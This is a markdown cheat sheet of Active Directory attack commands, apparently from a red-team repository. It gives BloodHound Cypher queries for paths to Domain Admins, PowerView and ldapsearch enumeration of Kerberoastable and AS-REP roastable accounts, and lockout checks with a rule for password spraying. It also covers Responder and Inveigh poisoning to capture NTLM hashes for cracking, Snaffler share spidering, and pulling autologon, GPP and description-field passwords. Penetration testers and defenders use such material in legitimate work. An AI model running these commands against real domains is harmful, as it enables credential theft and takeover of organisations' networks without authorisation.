# AD Enumeration — BloodHound, PowerView, LDAP

---

## BloodHound — query catalog

Import SharpHound zip, then run these queries in BloodHound UI or via Cypher.

### Pre-built queries (Analytics tab)

```
Find all Domain Admins
Shortest Paths to Domain Admins from Owned Principals
Find Principals with DCSync Rights
Find Computers where Domain Users are Local Admin
Find AS-REP Roastable Users (DontReqPreAuth)
List all Kerberoastable Accounts
Shortest Paths from Kerberoastable Users
Find Computers with Unconstrained Delegation
Find Computers with Constrained Delegation
Find Transitive Object Control (Owned → DA)
Shortest Paths to Domain Admins from Computers
```

### Custom Cypher queries

```cypher
// Find users with path to DA that don't require pre-auth
MATCH (u:User {dontreqpreauth: true})-[r*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name, length(r)

// Find computers where you can execute commands (local admin)
MATCH p=(u:User)-[:MemberOf*0..]->(g:Group)-[:AdminTo]->(c:Computer)
WHERE u.name =~ ".*CURRENT_USER.*"
RETURN c.name

// ACL paths: what can owned user write to?
MATCH p=(u:User)-[r:WriteDacl|WriteOwner|GenericWrite|GenericAll|ForceChangePassword]->()
WHERE u.name =~ ".*OWNED.*"
RETURN p

// Find unconstrained delegation computers (except DCs)
MATCH (c:Computer {unconstraineddelegation:true, domain:"DOMAIN.LOCAL"})
WHERE NOT c.name =~ ".*DC.*"
RETURN c.name, c.operatingsystem
```

### Mark owned principals

```
Right-click node → Mark as Owned
Use "Transitive Object Control" from owned node to find paths
```

---

## PowerView cheatsheet

```powershell
# Import
. .\PowerView.ps1
Import-Module .\PowerView.ps1

# Domain basics
Get-Domain
Get-DomainController | Select Name, IPAddress
Get-DomainPolicy | Select -ExpandProperty SystemAccess
(Get-DomainPolicy)["system access"]  # lockout policy

# Users
Get-DomainUser | Select samaccountname, memberof, admincount, lastlogon, pwdlastset
Get-DomainUser -SPN                   # Kerberoastable users
Get-DomainUser -UACFilter NOT_PREAUTH  # AS-REP roastable

# Groups
Get-DomainGroup | Select name, membercount
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins"
Get-NetLocalGroup -ComputerName <host>           # local groups on host
Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators

# Computers
Get-DomainComputer | Select dnshostname, operatingsystem, lastlogontimestamp
Get-DomainComputer -Unconstrained         # unconstrained delegation
Get-DomainComputer -TrustedToAuth         # constrained delegation

# Shares
Find-DomainShare -CheckShareAccess        # shares current user can read
Get-NetShare -ComputerName <host>

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where IdentityReferenceName -match "<user>"
Get-ObjectAcl -SamAccountName "<user>" -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping     # enumerate all trusts recursively

# GPO
Get-DomainGPO | Select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup   # GPOs that add users to local groups
```

---

## LDAP queries (raw — no PowerView needed)

```bash
# From Linux via ldapsearch
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(objectClass=user)" samaccountname userPrincipalName memberOf

# Kerberoastable users (servicePrincipalName set)
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(&(objectClass=user)(servicePrincipalName=*))" samaccountname servicePrincipalName

# AS-REP roastable
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samaccountname

# Domain admins
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(&(objectClass=group)(cn=Domain Admins))" member
```

---

## Domain trust enumeration

```powershell
# Current domain trusts
Get-DomainTrust

# Forest trusts
Get-ForestTrust

# Cross-domain exploitation:
# SID filtering bypassed for trust with SIDHistory allowed?
# Check: TrustAttributes 8 (TREAT_AS_EXTERNAL) or 64 (FOREST_TRANSITIVE)
# SID History attack across trusts: add SID from trusted domain to compromised account
```

---

## Password policy before spraying

```bash
# ALWAYS check before spraying
# crackmapexec
cme smb <dc_ip> -u user -p pass --pass-pol

# net command (from Windows)
net accounts /domain

# PowerView
(Get-DomainPolicy)["system access"]
# Check: LockoutBadCount, LockoutDuration, ResetLockoutCount

# enum4linux-ng
enum4linux-ng -P -u user -p pass <dc_ip>

# rpcclient (unauthenticated, if null session allowed)
rpcclient -U "" -N <dc_ip> -c "getdompwinfo"

# ldapsearch
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Rule: if LockoutBadCount = 5, spray maximum 3 passwords and wait LockoutDuration before next batch.

---

## Network reconnaissance (pre-domain)

```bash
# Passive network enumeration — identify AD traffic patterns
sudo tcpdump -i <interface> -n port 88 or port 389 or port 445

# Responder in analyze mode (no poisoning) — identify LLMNR/NBT-NS/mDNS requests
sudo responder -I <interface> -A

# Discover alive hosts
fping -asgq <subnet>/24

# Identify domain controllers via DNS SRV records
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>
dig SRV _kerberos._tcp.<domain> @<dns_server>
```

---

## LLMNR/NBT-NS/mDNS poisoning

Capture NTLM hashes by answering broadcast name resolution queries.

```bash
# Responder (Linux attack host) — full poisoning mode
sudo responder -I <interface> -wv
# Hashes saved to /usr/share/responder/logs/
# Crack NTLMv2: hashcat -m 5600

# Responder with relay — disable SMB/HTTP, let ntlmrelayx handle them
# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
sudo responder -I <interface> -wv
```

```powershell
# Inveigh (Windows — when operating from domain-joined host)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (InveighZero)
.\Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y

# Retrieve captured hashes
Get-Inveigh -NTLMv2Unique
```

See `offensive-tools/network/responder/`, `offensive-tools/windows/inveigh/`.

---

## Credential hunting in shares (Snaffler)

```powershell
# Snaffler — automated share spider + content analysis
.\Snaffler.exe -s -d domain.local -o snaffler.log -v data

# Target specific hosts
.\Snaffler.exe -s -n host1,host2 -o results.log -v data

# Parse output for immediate wins
Select-String -Path snaffler.log -Pattern "(password|credential|secret)" -CaseSensitive:$false
```

```bash
# CrackMapExec spider_plus module
crackmapexec smb <target> -u user -p pass -M spider_plus --share 'Department Shares'

# SMBMap — enumerate readable shares
smbmap -u user -p pass -d domain.local -H <dc_ip>

# SMBClient — navigate manually
smbclient -U 'DOMAIN\user' "\\\\<host>\\ShareName"
```

See `offensive-tools/windows/snaffler/`.

---

## Credential fields and misconfigurations

```powershell
# Accounts with PASSWD_NOTREQD — may have empty or weak passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname, useraccountcontrol

# Passwords in user description fields (common in legacy environments)
Get-DomainUser * | Select samaccountname, description | Where {$_.Description -ne $null}

# Autologon credentials in registry
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultPassword"

# GPP passwords (legacy — MS14-025, still found in old environments)
crackmapexec smb <dc_ip> -u user -p pass -M gpp_autologin
crackmapexec smb <dc_ip> -u user -p pass -M gpp_password
```

---

## UAC enumeration

```powershell
# Check if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# 0x1 = enabled, 0x0 = disabled

# Check consent prompt behavior
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# 0x0 = no prompt, 0x5 = prompt for consent (default)
```
